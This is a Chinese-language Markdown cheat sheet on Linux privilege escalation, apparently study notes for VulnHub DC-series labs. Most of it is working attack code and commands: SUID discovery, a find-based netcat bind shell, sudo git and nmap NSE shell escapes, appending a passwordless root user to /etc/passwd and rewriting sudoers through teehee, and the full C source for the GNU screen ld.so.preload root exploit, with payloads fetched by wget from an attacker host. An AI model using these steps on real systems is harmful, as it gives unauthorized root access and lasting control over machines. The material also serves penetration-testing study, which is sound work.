# Linux提权

## 前言

提权本质：一方面是信息收集，另一方面是对内核漏洞的掌握情况

## 基础信息收集

```bash
suid命令提权查询：https://gtfobins.github.io/
```

## 提权操作

### 内核漏洞提权

具体案例可参考DC-3内核提权

1.查看发行版以及内核版本

```bash
cat /etc/issue
cat /etc/*-release

lsb_release -a
uname -a
```

2.kali查找漏洞

```
searchsploit ubuntu 16.04 4.4.x
searchsploit linux 3.10 CentOS Linux 7
```

### SUID提权

suid全称是Set owner User ID up on execution。SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】

常见的可用来提权的linux可执行文件如下：

```
Nmap, Vim, find, bash, more, less, nano, cp
```

查看可以suid 提权的可执行文件(查看拥有suid权限的命令)

```
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```


![image](../../ba-ji-shen-tou/vulnhub/img/vulnhub-dc1-13.png)

![image](img/vulnhub-dc1-13.png)

#### find提权

案例可见DC1的提权

```bash
find aaa - exec netcat -lvp 5555 -e /bin/sh \ # 反弹
find . -exec /bin/sh \; # 直接提权
```

#### Git提权

案例可见DC2的提权

https://gtfobins.github.io/gtfobins/git/

```
sudo -l

sudo git -p help config
!/bin/sh
```

#### teehee提权

案例参考可见DC4

```bash
eehee --help
1.直接写个 root 权限用户
echo "test::0:0:::/bin/sh" | sudo teehee -a /etc/passwd
cat /etc/passwd | grep '/bin/bash'
su test
whoami
2.在 sudoers 里给 charles 所有权限
echo "charles ALL=(ALL:ALL) ALL" | sudo teehee /etc/sudoers
sudo -l
sudo su
```

#### screen提权

案例参考可见DC5

首先kali运行如下
```sh
tee libhax.c <<-'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

tee rootshell.c <<-'EOF'
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF

gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c
gcc -o ./rootshell ./rootshell.c
```

把编译好的 libhax.so 和 rootshell 从 kali 传给 靶机

```bash
python -m SimpleHTTPServer 8080 # kali

# 靶机
cd /tmp
wget 10.30.0.81:8080/libhax.so;wget 10.30.0.81:8080/rootshell

# 运行poc
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
whoami
```

#### nmap提权

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
sudo -l  # nmap提权
# 提权思路： 将root权限bin/sh写入脚本插件，使用nmap运行脚本插件使用namp执行脚本，执行命令不会显示命令，建议使用python交互shell后更直观，提权成功
nmap -v

echo 'os.execute("/bin/sh")' > /tmp/root.nse
cat /tmp/root.nse
sudo nmap --script=/tmp/root.nse
whoami
```

## 参考文章

* https://wiki.xazlsec.com/project-9/doc-730/
* https://xz.aliyun.com/t/7924
* https://shng.fun/posts/2021-01-23-%E5%AD%A6%E4%B9%A0-Linux%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95.html
* https://www.freebuf.com/articles/web/280398.html
* https://www.hacking8.com/tiquan/other/Linux%E6%8F%90%E6%9D%83.html
